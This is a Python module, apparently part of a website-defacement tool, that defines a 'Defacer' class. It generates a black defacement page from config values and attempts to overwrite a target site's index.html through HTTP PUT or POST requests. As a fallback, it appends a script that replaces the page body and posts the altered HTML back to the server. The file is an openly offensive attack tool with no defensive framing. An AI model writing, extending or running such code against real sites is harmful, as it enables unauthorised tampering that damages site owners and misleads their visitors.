import requests
from bs4 import BeautifulSoup
import os
from config import Config

class Defacer:
    def __init__(self, target):
        self.target = target
        self.deface_html = self.load_deface_template()
    
    def load_deface_template(self):
        """Load or create deface template"""
        html_path = 'assets/deface.html'
        if not os.path.exists(html_path):
            self.create_deface_template()
        
        with open(html_path, 'r', encoding='utf-8') as f:
            return f.read()
    
    def create_deface_template(self):
        """Generate deface HTML"""
        html = Config.DEFACE_MESSAGE.format(title=Config.DEFACE_TITLE)
        
        full_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>{Config.DEFACE_TITLE}</title>
    <style>
        body {{ background: black; color: white; font-family: Arial; }}
        ::-webkit-scrollbar {{ display: none; }}
    </style>
</head>
<body>
{html}
</body>
</html>
        """
        
        os.makedirs('assets', exist_ok=True)
        with open('assets/deface.html', 'w') as f:
            f.write(full_html)
    
    def replace_index(self, url):
        """Replace target index.html"""
        print("[DEFACE] Replacing index.html...")
        
        # Method 1: Direct PUT/POST
        methods = ['PUT', 'POST']
        for method in methods:
            try:
                resp = requests.request(method, f"{url}/index.html", 
                                      data=self.deface_html,
                                      headers={'Content-Type': 'text/html'})
                if resp.status_code in [200, 201, 204]:
                    print("[+] Index replaced successfully!")
                    return True
            except:
                pass
        return False
    
    def inject_js(self, url):
        """JavaScript injection fallback"""
        print("[DEFACE] Injecting JavaScript...")
        js_payload = f"""
<script>
document.body.innerHTML = `{self.deface_html}`;
document.title = '{Config.DEFACE_TITLE}';
</script>
        """
        
        resp = requests.get(url)
        soup = BeautifulSoup(resp.content, 'html.parser')
        soup.body.append(BeautifulSoup(js_payload, 'html.parser'))
        
        requests.post(url, data=soup.prettify())